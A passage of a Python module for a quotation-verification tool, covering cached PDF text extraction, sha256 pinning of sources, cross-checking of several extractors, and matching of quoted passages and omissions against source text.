    extract_cmd: str | None,
    allowed: frozenset[str],
) -> tuple[readers.Extraction | None, SourceUnreadableError | None]:
    """One attempt at reading a source, memoized whether or not it succeeded.

    `functools.lru_cache` stores a value only on a normal return, so a cache around a function
    that raises memoizes nothing at all. `extract` raises on a source it cannot read, so every
    quotation against an unreadable document re-ran the extractor: measured at 2,210 poppler
    invocations for 14 unique artifacts, 158 times the work the corpus requires, and 95% of a
    21-minute run. The failure is per-document and does not become a different failure on the
    second quotation, so it is cached like any other answer.

    Returned as a pair rather than raised here, because the raising is `extract`'s contract and
    callers depend on it.
    """
    try:
        return _extract(pdf, page, declared_extractor(extract_cmd), allowed), None
    except SourceUnreadableError as e:
        return None, e


def extract(
    pdf: pathlib.Path,
    page: int | None = None,
    extract_cmd: str | None = None,
    allowed: frozenset[str] = DEFAULT_EXTRACTORS,
) -> str:
    """Text of a source, and the one seam every comparison reads through. Cached, so N quotes
    against one file is one extraction.

    Exported, and stood in for by callers outside this package: `repro`'s quote backend calls
    `check_one`, and its regression suite replaces this function so a test can fix what a
    document says on each page. Everything that compares a passage against a document takes
    its text from here for that reason -- an extractor chain that went around it would leave
    those stubs measuring the stand-in bytes on disk, and a wrong-page misquote would grade
    `unchecked` rather than `mismatch`, which `publication` warns on rather than fails.

    Raises `SourceUnreadableError` when the extraction toolchain is at fault -- a missing or
    refused command, a timeout, a permission error, nothing installed that can read a PDF --
    rather than returning empty text. An empty return means the document genuinely holds no
    extractable text on that page, which is a different fact and gets a different message.
    """
    got, failed = _extraction(pdf, page, extract_cmd, allowed)
    if failed is not None:
        raise failed
    assert got is not None
    _PROVENANCE[(pdf, page, extract_cmd, allowed)] = (
        got.extractor,
        got.fallback,
        got.fallback_reason,
    )
    return got.text


def extract_uncached(
    pdf: pathlib.Path,
    page: int | None = None,
    extract_cmd: str | None = None,
    allowed: frozenset[str] = DEFAULT_EXTRACTORS,
) -> str:
    """`extract`, reading the file every time. For a caller that has just hashed the artifact.

    `repro` hashes an artifact immediately before resolving a value in it, so a memoized read
    would produce a decision whose recorded digest does not describe the text it was computed
    from. It reached the uncached function through `extract.__wrapped__`, which existed only
    because `extract` was itself an `lru_cache` -- and when the memoization moved underneath,
    `getattr(extract, "__wrapped__", extract)` fell back to the cached function and silently
    kept reading stale text. A default that turns a fresh read into a cached one, with no error
    anywhere, is the wrong shape for the thing standing between a digest and the bytes it
    describes. So it is a name.
    """
    got = _extract(pdf, page, declared_extractor(extract_cmd), allowed)
    _PROVENANCE[(pdf, page, extract_cmd, allowed)] = (
        got.extractor,
        got.fallback,
        got.fallback_reason,
    )
    return got.text


def reading(
    pdf: pathlib.Path,
    page: int | None = None,
    extract_cmd: str | None = None,
    allowed: frozenset[str] = DEFAULT_EXTRACTORS,
) -> readers.Extraction:
    """Text and what produced it, with the text taken from `extract`.

    The provenance is read back from the table `extract` writes, so naming the extractor costs
    no second extraction. An entry that is not there means `extract` returned text no
    extractor here produced, because a caller replaced it; that text is the caller's and the
    provenance is not this module's to invent, so it is named `substituted` rather than
    guessed at.
    """
    extract_cmd = declared_extractor(extract_cmd)
    text = extract(pdf, None, extract_cmd, allowed) if extract_cmd else extract(pdf, page)
    known = _PROVENANCE.get((pdf, None if extract_cmd else page, extract_cmd, allowed))
    if known is None:
        return readers.Extraction(text, SUBSTITUTED)
    extractor, fallback, reason = known
    return readers.Extraction(text, extractor, fallback, reason)


@functools.lru_cache(maxsize=64)
def _reading_with(
    pdf: pathlib.Path, page: int | None, extractor: str
) -> tuple[readers.Extraction | None, SourceUnreadableError | None]:
    """One named extractor's attempt, memoized either way. See `_extraction`.

    This one matters more than it looks: `_second_opinion` reaches it on every `not found`, so
    a document no reader can open was re-attempted by every reader once per quotation.
    """
    try:
        return _reading_with_uncached(pdf, page, extractor=extractor), None
    except SourceUnreadableError as e:
        return None, e


def reading_with(
    pdf: pathlib.Path, page: int | None = None, *, extractor: str
) -> readers.Extraction:
    """One named extractor's own reading of a source. Triangulation, and nothing else."""
    got, failed = _reading_with(pdf, page, extractor)
    if failed is not None:
        raise failed
    assert got is not None
    return got


def _reading_with_uncached(
    pdf: pathlib.Path, page: int | None = None, *, extractor: str
) -> readers.Extraction:
    """One named extractor's own reading of a source. Triangulation, and nothing else.

    Cached like `extract`, since triangulating N quotations over one document must be one
    extraction per extractor rather than N. This reads the file rather than going through
    `extract`, because the question it answers is what a particular extractor makes of the
    bytes: a caller that replaced `extract` has said what the document contains, which is an
    answer to a different question, and routing it here would make every extractor agree by
    construction.
    """
    if extractor in (DEFAULT_EXTRACTOR, READING_ORDER):
        layout = extractor == DEFAULT_EXTRACTOR
        return readers.Extraction(_poppler(pdf, page, layout), extractor)
    if extractor in readers.READERS:
        return readers.Extraction(readers.READERS[extractor].read(pdf, page), extractor)
    raise SourceUnreadableError(pdf, f"no such extractor: {extractor}")


#: Kept pointing at the uncached read, which is what it meant while `extract` was itself the
#: cache. A caller using the old idiom gets the behaviour it was asking for rather than the
#: opposite of it.
extract.__wrapped__ = extract_uncached  # type: ignore[attr-defined]

#: The memoization sits under `extract` and `reading_with` now, so their `cache_clear` and
#: `cache_info` are delegated rather than lost. Both were public: the regression suites call
#: them, and a caller managing the cache should not have to know which function holds it.
extract.cache_clear = _extraction.cache_clear  # type: ignore[attr-defined]
extract.cache_info = _extraction.cache_info  # type: ignore[attr-defined]
reading_with.cache_clear = _reading_with.cache_clear  # type: ignore[attr-defined]
reading_with.cache_info = _reading_with.cache_info  # type: ignore[attr-defined]


def available_extractors() -> list[str]:
    """Which extractors this machine can ask about a PDF, in preference order.

    Used to decide who triangulation consults and what the report says it consulted. The chain
    does not use it: the chain attempts poppler and finds out, while this has to answer without
    running anything.
    """
    poppler = [DEFAULT_EXTRACTOR, READING_ORDER] if shutil.which("pdftotext") else []
    return poppler + readers.available()


@functools.lru_cache(maxsize=64)
def _digest(text: str) -> str:
    """sha256 of what an extractor produced, recorded beside the extractor that produced it."""
    return hashlib.sha256(text.encode()).hexdigest()


def _extractor_name(artifact: pathlib.Path, extract_cmd: str | None) -> str:
    """What `extract` reads this source with, as the report names it."""
    if reads_as_is(extract_cmd):
        return PLAIN_TEXT
    if extract_cmd := declared_extractor(extract_cmd):
        return " ".join(extract_cmd.split())
    if obvious := BY_SUFFIX.get(artifact.suffix.lower()):
        return obvious
    if (name := extractors.BY_SUFFIX.get(artifact.suffix.lower())) is not None:
        return extractors.Declared(extractors.EXTRACTORS[name]).name
    return PLAIN_TEXT if artifact.suffix.lower() in TEXT_SUFFIXES else DEFAULT_EXTRACTOR


@functools.lru_cache(maxsize=256)
def sha256(p: pathlib.Path) -> str:
    """Hash of a file on disk. The implementation is shared; this keeps the local name."""
    return sha256_of_file(p)


def clear_caches() -> None:
    """Forget every memoized extraction, folding and digest.

    One call rather than five, because a caller that clears four of them and forgets the fifth
    gets a stale answer that looks like a fresh one.
    """
    for cached in (_extraction, _reading_with, passage_fold, skeleton, _digest, sha256):
        cached.cache_clear()
    _PROVENANCE.clear()


def check_pin(artifact: pathlib.Path | None, expected: str | None) -> Pin:
    """Is the file on disk the file that was pinned?

    An unpinned source is reported as `unpinned`, never as `ok`: no hash was recorded, so
    nothing was checked, and saying otherwise would claim a guarantee the record does not make.
    """
    if artifact is None or not artifact.exists():
        return Pin("missing")
    if not (expected and expected.strip()):
        return Pin("unpinned")
    try:
        actual = sha256(artifact)
    except OSError:
        return Pin("missing")
    expected = expected.strip().lower()
    return Pin("ok" if actual == expected else "broken", expected, actual)


#: The reason on a quotation whose source is at no path this run could read.
MISSING = "file not found"


def library_copy(
    name: str, expected: str | None, pdfs: pathlib.Path | None
) -> tuple[pathlib.Path | None, str]:
    """The library's copy of a source that is not at the path its record names, and why not.

    A public repository carries each source's sha256 and not the source, so the path a record
    names is empty on every machine but the author's, while the library on that machine may
    hold the file. `pdfs` is the library's `pdfs/` directory, and the copy looked for is the
    file there under the record's own filename.

    The pin is the identity. The name only says where to look, so the copy is returned only
    where its bytes hash to `expected`: a record with no pin has nothing to prove the library's
    file is the same document, and a file under the right name with other bytes is another
    document. Both return None with a reason that says so. A library holding no file under
    that name returns `MISSING` alone, which is what an absent source has always read as.

    Nothing is written and nothing is fetched.
    """
    held = pdfs / name if pdfs else None
    if held is None or not held.is_file():
        return None, MISSING
    if not (expected and expected.strip()):
        return None, (
            f"{MISSING} at the path the record names; the library holds a file under that name, "
            f"and it is read only where the record pins a sha256 for it to match"
        )
    try:
        actual = sha256(held)
    except OSError:
        return None, MISSING
    expected = expected.strip().lower()
    if actual != expected:
        return None, (
            f"{MISSING} at the path the record names; the library holds a file under that name "
            f"that does not match the pin (pinned {expected[:12]}, library {actual[:12]})"
        )
    return held, ""


def check_derived(text: str, expected: str | None) -> Pin:
    """Is the text an extractor produced the text the quotations were pinned against?

    `expected` is the source's `derived_sha256`. A source that records none is `unpinned`,
    never `ok`, for the reason `check_pin` gives: nothing was compared. The caller supplies
    the text, so a source no extractor could read never reaches this and is not reported as
    a reading that changed -- its quotations are `unchecked` and say why.
    """
    if not (expected and expected.strip()):
        return Pin("unpinned")
    expected, actual = expected.strip().lower(), _digest(text)
    return Pin("ok" if actual == expected else "broken", expected, actual)


def check_one(
    quote: str,
    artifact: pathlib.Path | None,
    page: int | None = None,
    extract_cmd: str | None = None,
    allowed: frozenset[str] = DEFAULT_EXTRACTORS,
    triangulate: bool = False,
    prefix: str = "",
    suffix: str = "",
    missing: str = MISSING,
) -> Result:
    """Does this passage appear in this source, and what read the source to decide?

    `missing` is the reason recorded where the artifact is not on disk, for a caller that
    looked somewhere else for it and knows more than that it is absent.

    `prefix` and `suffix` are the W3C `TextQuoteSelector` neighbours, consulted only where the
    passage occurs more than once. Both default to empty, so a caller that has never carried
    them gets the verdict it always got on any passage that resolves uniquely.

    `extract_cmd` is the command the claims file declares; `allowed` is the set of programs
    this run will run, which the caller decides rather than the file. A command that is
    refused, missing, failing or silent yields `unchecked` carrying the reason -- none of
    those makes the passage absent.

    One extractor by default. `triangulate` asks every installed reader instead and reports
    `indeterminate` where they disagree, which costs one extraction per reader and is why it
    is not the default. It does not apply to a source that declares a command: there is one
    declared extractor, nothing to disagree with, and `agreement` stays empty rather than
    claiming a comparison nothing performed.
    """
    extract_cmd = declared_extractor(extract_cmd)
    warn: list[str] = []
    text = quote.strip()
    if len(text) < MIN_QUOTE_CHARS or text.endswith(
        (",", " and", " or", " but", " the", " a", " of", " for", " with")
    ):
        warn.append("short")

    if artifact is None or not artifact.exists():
        return Result("unchecked", missing, warn)

    if triangulate and not extract_cmd and is_paginated(artifact):
        return _triangulate(quote, artifact, page, warn, prefix, suffix)

    # `extract` is called with the arguments it has always taken where nothing is declared. It
    # is exported, and a caller that wraps or substitutes it wrote against the two-argument
    # shape; a source with no `extract_cmd` must not start reaching them for a new one.
    try:
        got = reading(artifact, None, extract_cmd, allowed) if extract_cmd else reading(artifact)
    except SourceUnreadableError as e:
        return Result("unchecked", e.detail, warn)
    if not got.text.strip():
        return Result("unchecked", "no text extracted", warn)

    # A declared extractor renders the whole document at once, so there is no page to ask it
    # about: the position a `.txt` source is already in. Asking `pdftotext` for the page
    # instead would run a PDF reader over a source whose author said it is not one.
    # A page can be checked only where this module can ask for one page on its own terms, which
    # means no declared command: an arbitrary program has no page flag, and asking `pdftotext`
    # for page 4 of a source whose author declared `detex` would run a PDF reader over something
    # they just said is not a PDF.
    #
    # What that left was silent. A record asserting `page: 3` under a declared `pdftotext
    # -layout` had the assertion dropped and reported nothing: 154 page assertions in one
    # audited claim, and page 9999 on a three-page document graded exactly as page 3 did. An
    # unverifiable assertion is a fact about the check and belongs in the report, so it is a
    # warning now rather than an omission.
    #
    # A built-in extractor has no pages either, and no second reader: a workbook's rows are
    # what they are, and sending the PDF readers after one would name four programs that
    # cannot open it as having looked.
    paged = is_paginated(artifact) and not extractors.is_builtin(got.extractor)
    paginated = extract_cmd is None and paged
    if page and not paginated and paged:
        warn.append("page unchecked")
    result = _verdict(
        quote, got.text, artifact, page if paginated else None, warn, got.extractor, prefix, suffix
    )
    result.extractor = got.extractor
    result.extraction_digest = _digest(got.text)
    result.fallback = got.fallback
    result.fallback_reason = got.fallback_reason

    # One reader saying no is not the document saying no. Only on a paginated source: the text
    # of a `.txt` is its bytes, and there is no second way to read them.
    if result.state == "not found" and paged:
        consulted = [got.extractor]
        rescued = _second_opinion(
            quote, artifact, page if paginated else None, warn, got.extractor, prefix, suffix
        )
        if rescued is not None:
            return rescued
        consulted += [n for n in available_extractors() if n != got.extractor]
        # Appended, not substituted. Which readers looked and where the passage stopped matching
        # answer different questions, and the second is the one that says what to do next.
        result.detail = (
            f"not found by any of {', '.join(dict.fromkeys(consulted))}, so the passage is "
            f"absent under every reader installed here; {result.detail}"
        )
    return result


def _second_opinion(
    quote: str,
    artifact: pathlib.Path,
    page: int | None,
    warn: list[str],
    missed_by: str,
    prefix: str = "",
    suffix: str = "",
) -> Result | None:
    """Ask the other readers before reporting a passage absent. `None` if none of them finds it.

    `not found` is an accusation against the manuscript -- the source was read and the passage
    is not in it -- and one reader is not enough to make it. `-layout` preserves a page's
    visual geometry, so on a two-column paper it interleaves the columns and shreds every
    sentence that spans the gutter. Measured on `dai_2022_knowledge_neurons.pdf`: 110 of 160
    quotations read as absent under `pdftotext -layout` and 157 resolve under pypdf. Nothing
    was wrong with the quotations, and an audit reported 110 failures against a claim whose
    source contains the text.

    Detecting the column layout was the alternative and is a worse instrument: it guesses at a
    property this measures. Asking the next reader answers the same question exactly, and only
    on the path where the first answer was going to be an accusation.

    Reached on `not found` alone. Never on `ambiguous`: a passage occurring twice is in the
    document, and a reader that merges columns could "resolve" the ambiguity by hiding an
    occurrence, which loses the evidence rather than settling it.

    A rescued passage is recorded as a fallback naming both readers, so it never becomes
    indistinguishable from one the declared reader found itself.
    """
    for name in available_extractors():
        if name == missed_by:
            continue
        try:
            got = reading_with(artifact, extractor=name)
        except SourceUnreadableError:
            continue
        if not got.text.strip() or resolve_in(quote, got.text, prefix, suffix).state != "found":
            continue
        result = _verdict(quote, got.text, artifact, page, warn, name, prefix, suffix)
        result.extractor = name
        result.extraction_digest = _digest(got.text)
        result.fallback = True
        result.fallback_reason = f"{missed_by} did not find this passage; {name} did"
        return result
    return None


def _triangulate(
    quote: str,
    artifact: pathlib.Path,
    page: int | None,
    warn: list[str],
    prefix: str = "",
    suffix: str = "",
) -> Result:
    """Ask every installed extractor, and report disagreement as disagreement.

    An extractor that could not open the file contributes no verdict rather than a `not
    found`: "this reader failed" and "this reader read it and the passage is not there" are
    the two facts the outcome model exists to keep apart, and pooling them here would smuggle
    the first into the second one level down.

    The two poppler modes are one binary and are not independent of each other, so their
    agreeing is weaker evidence than poppler agreeing with pypdf. What they are here for is
    that they disagree in opposite directions, and a disagreement between them is the case
    `indeterminate` exists to report rather than to resolve.
    """
    verdicts: dict[str, Result] = {}
    reasons: list[str] = []
    for name in available_extractors():
        try:
            got = reading_with(artifact, extractor=name)
        except SourceUnreadableError as e:
            reasons.append(e.detail)
            continue
        if not got.text.strip():
            reasons.append(f"{name}: no text extracted")
            continue
        verdicts[name] = _verdict(quote, got.text, artifact, page, warn, name, prefix, suffix)
        verdicts[name].extraction_digest = _digest(got.text)

    if not verdicts:
        return Result("unchecked", "; ".join(reasons) + _hint(artifact), list(warn))

    agreement = {name: r.state for name, r in verdicts.items()}
    # The preferred extractor that reached a verdict carries the warnings and the page
    # finding: they describe the text, and merging warnings from readings that disagree about
    # the text would attribute to one document what two extractions said.
    lead = next(name for name in available_extractors() if name in verdicts)
    result = verdicts[lead]
    result.extractor = lead
    result.fallback = lead != DEFAULT_EXTRACTOR
    result.agreement = agreement

    if len(set(agreement.values())) > 1:
        said = ", ".join(f"{name} {state}" for name, state in agreement.items())
        return Result(
            "indeterminate",
            f"extractors disagree ({said}); the document is not determinate under them",
            list(warn),
            extractor=lead,
            extraction_digest=result.extraction_digest,
            fallback=result.fallback,
            agreement=agreement,
        )
    return result


def _positions(needle: str, doc: str) -> list[int]:
    """Where `needle` occurs in `doc` on a token boundary, in order.

    A passage whose last character is alphanumeric and which is followed by another is a
    shared prefix rather than an occurrence: `the catalog` inside `the catalogue` is not the
    document saying `the catalog` a second time. Counting those would report a passage as
    ambiguous because some longer word happens to begin with it.

    Where no occurrence lands cleanly every occurrence is returned instead. A quotation that only
    ever cuts a word stays `found` and keeps its `truncated` warning, which is the behaviour
    `_cuts_a_token` exists to produce and states as its own rule: a quote that lands cleanly
    somewhere in the document is quoting that place.
    """
    if not needle:
        return []
    cuts_matter = needle[-1].isalnum()
    total: list[int] = []
    clean: list[int] = []
    at = doc.find(needle)
    while at >= 0:
        total.append(at)
        after = at + len(needle)
        if not cuts_matter or after >= len(doc) or not doc[after].isalnum():
            clean.append(at)
        at = doc.find(needle, at + 1)
    return clean or total


def _count(needle: str, doc: str) -> int:
    """How many occurrences `_positions` finds."""
    return len(_positions(needle, doc))


def _occurrences(
    quote: str, doc: str, prefix: str, suffix: str, transform: Callable[[str], str]
) -> tuple[int, bool]:
    """How often the passage occurs in `doc`, and whether its anchors single one out.

    `doc` arrives already transformed; the quotation and its anchors are transformed here, so
    both sides of every comparison went through the same function.

    A count, where this was a substring test. `passage in document` answers a weaker question
    than the record asks: a quotation points at one passage, and a pointer resolving to three
    of them has identified none of them. Where the passage repeats, the anchors are joined to
    it and the joined form is counted instead, which is how the record says which occurrence
    it meant. Joined and then folded, rather than folded and then joined, because folding
    collapses the whitespace across each seam exactly as it collapsed it in the document.

    The anchors are joined as written first, and with a space at each seam second. A YAML plain
    scalar cannot begin or end with a space, so `suffix: in August` arrives without the space
    that separates it from the passage, welds into `splitin August`, and matched nothing: the
    report then said to widen an anchor that was already wide enough. As written comes first,
    so an anchor that does end mid-word still selects the occurrence it names.
    """
    q = transform(quote)
    if not q:
        return 0, False
    n = _count(q, doc)
    if n <= 1:
        return n, n == 1
    if not (prefix or suffix):
        return n, False
    if _count(transform(prefix + quote + suffix), doc) == 1:
        return n, True
    spaced = " ".join(part for part in (prefix, quote, suffix) if part)
    return n, _count(transform(spaced), doc) == 1


@dataclass(frozen=True)
class Match:
    """Whether a passage occurs in a text, how often, and how hard the match had to work."""

    state: State
    count: int
    """Occurrences that count under `_count`. Zero where the passage is not there."""
    normalized: bool
    """Whether it resolved only on the whitespace-stripped skeleton, which is the weaker
    match and is reported as a warning wherever a `Result` is produced."""


def resolve_in(quote: str, text: str, prefix: str = "", suffix: str = "") -> Match:
    """Does this passage occur in this text, and does it occur exactly once?

    The verdict without a file. `check_one` reads an artifact and then decides; this decides
    against text the caller already holds. A tool that does its own extraction needs that seam
    in order to share these matching rules instead of reimplementing them, and reimplementing
    them is how a second normalizer ends up folding `-0.42` and `0.42` together while the
    first one does not.

    Verbatim first, then the whitespace-stripped skeleton. Never `unchecked` or
    `indeterminate`: both are facts about reading a source, and this one was handed a text.
    """
    if not passage_fold(quote):
        return Match("not found", 0, False)
    n, singled = _occurrences(quote, passage_fold(text), prefix, suffix, passage_fold)
    if n:
        return Match("found" if singled else "ambiguous", n, False)
    k, k_singled = _occurrences(quote, skeleton(text), prefix, suffix, skeleton)
    if k:
        return Match("found" if k_singled else "ambiguous", k, True)
    return Match("not found", 0, False)


def single_out(quote: str, text: str, occurrence: int) -> tuple[str, str] | None:
    """The `prefix` and `suffix` that make `resolve_in` find one occurrence of a repeated passage.

    `occurrence` counts from 1 over the occurrences `resolve_in` counts, in the order the
    source has them. `None` where the source has no such occurrence.

    The anchors are the source's own text on either side, as the matcher reads it. Where the
    passage matches under `passage_fold` that is lower case with single spaces. Where it
    matches only on the `skeleton` it is that text with no spaces at all, since the skeleton is
    what the anchored passage is then compared in.

    They are taken 16 folded characters out on each side, then 32, then 64, doubling, each time
    carried on to the end of the word the cut lands in, until the anchored passage is in the
    source once and that once is this occurrence. Two occurrences inside blocks that repeat in
    full are told apart only where a block ends, which can be the whole document away, so the
    widening stops where either anchor would pass `MAX_ANCHOR_CHARS` and the answer is `None`.

    Each candidate is put through the join `_occurrences` performs before it is returned, so a
    pair this returns is a pair `resolve_in` resolves, for the quotation exactly as given: a
    caller writing the pair to a file writes that same quotation. `None` as well where no pair
    does. That is a quotation with white space at either end, or one matched on the skeleton
    whose own edge is a hyphen, which folds differently beside a neighbour than alone.
    """
    for transform in (passage_fold, skeleton):
        q, doc = transform(quote), transform(text)
        if at := _positions(q, doc):
            break
    else:
        return None
    if not 1 <= occurrence <= len(at):
        return None
    start, end = at[occurrence - 1], at[occurrence - 1] + len(q)
    width = 16
    while True:
        s, e = max(0, start - width), min(len(doc), end + width)
        while s > 0 and doc[s - 1].isalnum() and doc[s].isalnum():
            s -= 1
        while e < len(doc) and doc[e - 1].isalnum() and doc[e].isalnum():
            e += 1
        prefix, suffix = doc[s:start].lstrip(), doc[end:e].rstrip()
        if max(len(prefix), len(suffix)) > MAX_ANCHOR_CHARS:
            return None
        s, e = start - len(prefix), end + len(suffix)
        if transform(prefix + quote + suffix) == doc[s:e] and _positions(doc[s:e], doc) == [s]:
            return prefix, suffix
        if width >= len(doc):
            return None
        width *= 2


def _stretch(text: str, doc: str, a: int, b: int) -> tuple[int, int] | None:
    """The stretch of `text` that folds to `doc[a:b]`, where `doc` is `passage_fold(text)`.

    Folding does not keep a map back to the characters it read, so the stretch is looked for:
    the shortest leading part of `text` whose folding reaches each offset, by bisection. A
    leading part usually folds to a leading part of the whole, and not always, since a hyphen
    before a line break is in one and gone from the other. So the stretch is folded and
    compared before it is returned, and `None` is the answer where it does not fold to
    exactly what matched.

    The shortest stretch stops before a combining mark that follows its last letter, because
    the mark folds to nothing: `cafe` and its acute accent written as two characters would
    come back as `cafe`. The marks that follow are the source's and are taken with it.
    """
    fold = passage_fold.__wrapped__  # not through the cache, which holds whole documents

    def reach(n: int) -> int:
        lo, hi = 0, len(text)
        while lo < hi:
            mid = (lo + hi) // 2
            lo, hi = (lo, mid) if len(fold(text[:mid])) >= n else (mid + 1, hi)
        return lo

    s, e = reach(a + 1) - 1, reach(b)
    while e < len(text) and unicodedata.combining(text[e]):
        e += 1
    return (s, e) if s >= 0 and fold(text[s:e]) == doc[a:b] else None


#: Characters `passage_fold` turns into a space that are not white space in the source, and
#: every character that might be: the control characters it replaces, and anything outside
#: ASCII, where the spacing accents and the spaces that group digits are.
_CONTROL = re.compile(r"[\x00-\x08\x0b\x0e-\x1f\x7f]")
_MAYBE_MADE = re.compile(r"[\x00-\x08\x0b\x0e-\x1f\x7f]|[^\x00-\x7f]")


@functools.lru_cache(maxsize=64)
def _tokens(text: str) -> tuple[str, frozenset[int]] | None:
    """The folded source, and which of its spaces are not white space in the source.

    `passage_fold` writes a space in three places where a reader of the source sees none: for
    a control character a font left in the middle of a word, for a spacing accent such as
    `´` or `¨`, whose compatibility form is a space carrying the mark, and for the thin,
    narrow or no-break space that groups the digits of `12 500`. Matching wants those folded
    away, and counting tokens does not: `500` is not a word of a source that reads `12 500`.

    So the source is folded a second time with each of those characters replaced by one that
    survives folding, and the two foldings are laid side by side. A space in the folded source
    that is that character in the second folding is one the fold made. `None` where the two
    do not agree everywhere else, which leaves nothing to count tokens in.
    """
    mark = next(c for c in map(chr, range(0xE000, 0xF8FF)) if c not in text)
    kept = list(text)
    replaced = False
    for m in _MAYBE_MADE.finditer(text):
        i, c = m.start(), m.group()
        grouping = (
            c != " "
            and unicodedata.category(c) == "Zs"
            and 0 < i < len(text) - 1
            and text[i - 1].isdigit()
            and text[i + 1].isdigit()
        )
        accent = not c.isspace() and " " in unicodedata.normalize("NFKD", c)
        if grouping or accent or _CONTROL.match(c):
            kept[i] = mark
            replaced = True
    doc = passage_fold(text)
    if not replaced:
        return doc, frozenset()
    made: set[int] = set()
    out: list[str] = []
    for c in passage_fold.__wrapped__("".join(kept)):
        if c not in (" ", mark):
            out.append(c)
        elif not out:
            continue
        elif out[-1] != " ":
            out.append(" ")
            if c == mark:
                made.add(len(out) - 1)
        elif c == " ":
            made.discard(len(out) - 1)
    while out and out[-1] == " ":
        made.discard(len(out) - 1)
        out.pop()
    return (doc, frozenset(made)) if "".join(out) == doc else None


def _fittings(
    words: list[str], doc: str, made: frozenset[int], cap: int
) -> tuple[list[list[tuple[int, int, int]]], bool]:
    """Every way `words` fits `doc` as pieces under `omission`'s rule, up to `cap` of them.

    Each way is its pieces in order, as (words before the piece, where it starts in `doc`,
    where it ends). The second value is whether the listing stopped at the cap.
    """
    n = len(words)

    def break_at(k: int) -> bool:
        return k < 0 or k >= len(doc) or (doc[k] == " " and k not in made)

    def fits(at: int, end: int, i: int, j: int) -> bool:
        # A cut needs white space of the source's own on its outer side. The quotation's two
        # ends are not cuts, and are held only to not parting two letters or digits.
        left = break_at(at - 1) or (not i and not (doc[at - 1].isalnum() and doc[at].isalnum()))
        right = break_at(end) or (j == n and not (doc[end - 1].isalnum() and doc[end].isalnum()))
        return left and right

    def piece(i: int, j: int) -> str:
        return " ".join(words[i:j])

    # Forward: the cuts any fitting can reach, with the earliest the words before each can
    # end. Most cuts are reached by nothing, and nothing below looks at those.
    earliest: dict[int, int] = {0: -3}
    for i in range(n):
        if i not in earliest:
            continue
        for j in range(i + 1, n + 1):
            p = piece(i, j)
            if len(p) < MIN_PIECE_CHARS:
                continue
            at = doc.find(p, earliest[i] + 3)
            if at < 0:
                break
            while at >= 0 and not fits(at, at + len(p), i, j):
                at = doc.find(p, at + 1)
            if at >= 0:
                earliest[j] = min(earliest.get(j, len(doc)), at + len(p))
    cuts = sorted(earliest)
    if n not in earliest:
        return [], False

    # Backward: the last place a piece beginning at each cut can start and the rest still
    # fit. A piece placed later than that leads nowhere, so the listing never follows one.
    latest: dict[int, int] = {n: len(doc)}
    for i in reversed(cuts[:-1]):
        for j in (j for j in cuts if j > i and j in latest):
            p = piece(i, j)
            if len(p) < MIN_PIECE_CHARS:
                continue
            # No earlier than the words before it can end, which keeps the search short.
            low = max(0, earliest[i] + 3)
            at = doc.rfind(p, low, len(doc) if j == n else latest[j] - 3)
            if at < 0 and doc.find(p, low) < 0:
                break  # nor is any longer piece from here
            while at >= 0 and not fits(at, at + len(p), i, j):
                at = doc.rfind(p, low, at + len(p) - 1)
            if at >= 0:
                latest[i] = max(latest.get(i, -1), at)

    found: list[list[tuple[int, int, int]]] = []

    def place(i: int, frm: int, so_far: list[tuple[int, int, int]]) -> bool:
        """List the ways from word i on. False once the cap is reached."""
        for j in (j for j in cuts if j > i and j in latest):
            p = piece(i, j)
            if len(p) < MIN_PIECE_CHARS:
                continue
            at = doc.find(p, frm)
            if at < 0:
                break
            while 0 <= at and (j == n or at + len(p) + 3 <= latest[j]):
                if fits(at, at + len(p), i, j):
                    here = [*so_far, (i, at, at + len(p))]
                    if j == n:
                        if len(found) == cap:
                            return False
                        found.append(here)
                    # Past the space after this piece, a token and the space after that.
                    elif not place(j, at + len(p) + 3, here):
                        return False
                at = doc.find(p, at + 1)
        return True

    capped = not place(0, 0, [])
    return [f for f in found if len(f) > 1], capped


def omission(quote: str, text: str) -> Omission | None:
    """What a quotation leaves out, if that is all that separates it from the source.

    Both sides are folded with `passage_fold` and nothing looser, and read as tokens. A token
    is a stretch of the source between white space of the source's own: `-0.42`, `1.81`,
    `12,500`, `non-significant`, `5.3%` and `risk,` are one token each. White space is what a
    reader of the source sees as such. A control character inside a word, a spacing accent
    (`don´t`, `na¨ive`) and a thin, narrow or no-break space between two digits (`12 500`)
    fold to a space and are not white space, so each of those is one token too; `_tokens`
    tells them apart. `None` unless the quotation divides into two or more pieces such that:

        every piece is a run of whole tokens of the quotation;
        where the quotation is cut, the source has white space on the outer side of the piece,
            so the piece before a gap ends with a whole token of the source and the piece
            after it begins with one;
        every piece is at least `MIN_PIECE_CHARS` folded characters;
        the pieces occur in the source in the quotation's order, none overlapping the last;
        at least one whole token of the source lies between each piece and the next.

    The two ends of the quotation are not cuts, and are held to what the ends of any quotation
    are held to: neither may fall between two letters or digits of the source. A quotation may
    therefore stop before a sentence's full stop, as one that is `found` may.

    So what is left out is always whole tokens, and a cut never falls inside one. A quotation
    reading `0.42` where the source reads `-0.42`, `1` for `1.81`, `500` for `12,500`,
    `significant` for `non-significant` or `5` for `5.3%` has changed a token, and a changed
    token is in no piece. The same holds for punctuation: `risk the` against a source reading
    `risk, the` or `risk/the` leaves out no token and changes one, so it is not an omission,
    whatever the punctuation is. To leave a clause out, a piece has to end with the token's
    own punctuation, as the source has it.

    A changed word is in some piece too, and that piece is then in the source only where the
    source says the changed thing somewhere later, in at least `MIN_PIECE_CHARS` characters
    of the quotation's own wording. The minimum length makes that rare and does not rule it
    out: `a significant increase in mortality` spliced onto the subject of a sentence that
    reports a decrease is reported as an omission when a later sentence reports the increase.
    Every piece is the source's, the join is not, and the result is `not found` either way.

    Which way of fitting is reported. Every way is listed, up to `MAX_FITTINGS`: a way is a
    division into pieces and a place in the source for each. The one reported spans the
    shortest passage, which is the one that leaves the least out; of two that tie, the one
    with fewer pieces, and then the one earlier in the source. `fittings` is how many there
    are, and `unique` whether every other one spans a passage that contains the reported one
    and is longer.

    `Gap.tokens` and `Gap.position` count tokens as defined above, in the folded source. A
    word the source breaks across a line with a hyphen is one token, as it is one word.

    Text with no white space between words, such as Chinese or Japanese, is one token a
    sentence and is not read as an omission by this rule.

    The answer carries the text left out at each gap and the whole passage the pieces span,
    in the source's own characters where `_stretch` can recover them.

    Asked only about a passage `resolve_in` did not find, and never changes that verdict.
    """
    words = passage_fold(quote).split(" ")
    if (read := _tokens(text)) is None:
        return None
    doc, made = read
    ways, capped = _fittings(words, doc, made, MAX_FITTINGS)
    if not ways:
        return None

    def span(way: list[tuple[int, int, int]]) -> tuple[int, int]:
        return way[0][1], way[-1][2]

